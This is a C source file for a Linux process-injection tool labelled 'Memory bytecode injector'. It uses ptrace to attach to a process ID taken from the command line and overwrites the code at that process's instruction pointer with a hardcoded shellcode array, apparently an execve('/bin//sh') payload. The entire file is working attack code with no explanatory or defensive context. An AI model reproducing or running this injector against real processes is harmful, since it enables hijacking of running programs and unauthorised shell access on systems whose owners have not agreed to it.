#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>

char shellcode[] = 
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97"
"\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    int pid = atoi(argv[1]), size = sizeof(shellcode), i;
    struct user_regs_struct reg;

    char *buff = malloc(size);
    if (!buff) {
        perror("malloc");
        return 1;
    }
    memcpy(buff, shellcode, size);

    printf("----Memory bytecode injector-----\n");

    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1) {
        perror("PTRACE_ATTACH");
        return 1;
    }
    wait(NULL);

    if (ptrace(PTRACE_GETREGS, pid, 0, &reg) == -1) {
        perror("PTRACE_GETREGS");
        return 1;
    }

#ifdef __x86_64__
    printf("Writing RIP 0x%llx, process %d\n", (long long)reg.rip, pid);
#else
    printf("Writing EIP 0x%lx, process %d\n", reg.eip, pid);
#endif

    for (i = 0; i < size; i += sizeof(long)) {
        long val;
        memcpy(&val, buff + i, sizeof(long));
        ptrace(PTRACE_POKETEXT, pid, reg.rip + i, val);
    }

    ptrace(PTRACE_DETACH, pid, 0, 0);
    free(buff);
    return 0;
}
